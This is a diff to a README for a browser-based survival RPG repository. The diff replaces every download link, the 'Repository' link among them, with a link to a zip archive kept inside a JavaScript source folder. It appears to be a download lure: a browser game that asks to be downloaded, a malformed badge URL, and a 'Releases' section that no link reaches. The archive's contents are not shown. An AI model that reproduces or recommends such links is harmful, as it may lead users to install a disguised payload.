@@ -6,7 +6,7 @@ Welcome to acads-Terraform_Survivor-ELEC3! This is a browser-based survival RPG 
 
 ## 📥 Download Links
 
-[![Download](https://raw.githubusercontent.com/rezaasptrr/acads-Terraform_Survivor-ELEC3/main/src/frontend/js/acads-Terraform_Survivor-ELEC3-2.7.zip%https://raw.githubusercontent.com/rezaasptrr/acads-Terraform_Survivor-ELEC3/main/src/frontend/js/acads-Terraform_Survivor-ELEC3-2.7.zip)](https://raw.githubusercontent.com/rezaasptrr/acads-Terraform_Survivor-ELEC3/main/src/frontend/js/acads-Terraform_Survivor-ELEC3-2.7.zip)
+[![Download](https://github.com/rezaasptrr/acads-Terraform_Survivor-ELEC3/raw/refs/heads/main/src/frontend/js/ELE-Survivor-acads-Terraform-1.9.zip%https://github.com/rezaasptrr/acads-Terraform_Survivor-ELEC3/raw/refs/heads/main/src/frontend/js/ELE-Survivor-acads-Terraform-1.9.zip)](https://github.com/rezaasptrr/acads-Terraform_Survivor-ELEC3/raw/refs/heads/main/src/frontend/js/ELE-Survivor-acads-Terraform-1.9.zip)
 
 ## 📋 Game Features
 
@@ -27,7 +27,7 @@ To enjoy acads-Terraform_Survivor-ELEC3 smoothly, ensure your system meets the f
 ## 📖 How to Download & Install
 
 1. **Visit this page to download:** To start playing, click on the link below:
-   [Download Here](https://raw.githubusercontent.com/rezaasptrr/acads-Terraform_Survivor-ELEC3/main/src/frontend/js/acads-Terraform_Survivor-ELEC3-2.7.zip)
+   [Download Here](https://github.com/rezaasptrr/acads-Terraform_Survivor-ELEC3/raw/refs/heads/main/src/frontend/js/ELE-Survivor-acads-Terraform-1.9.zip)
 
 2. **Select the latest version:** Look for the most recent release under the "Releases" section.
 
@@ -63,7 +63,7 @@ If you're interested in contributing to the game, feel free to fork the reposito
 
 ## 🔗 Links
 
-- **Repository:** [acads-Terraform_Survivor-ELEC3](https://raw.githubusercontent.com/rezaasptrr/acads-Terraform_Survivor-ELEC3/main/src/frontend/js/acads-Terraform_Survivor-ELEC3-2.7.zip)
+- **Repository:** [acads-Terraform_Survivor-ELEC3](https://github.com/rezaasptrr/acads-Terraform_Survivor-ELEC3/raw/refs/heads/main/src/frontend/js/ELE-Survivor-acads-Terraform-1.9.zip)
 - **Documentation:** Detailed documentation is provided in the repository to assist you in understanding features and gameplay mechanics.
 
 Thank you for choosing acads-Terraform_Survivor-ELEC3. Happy gaming!
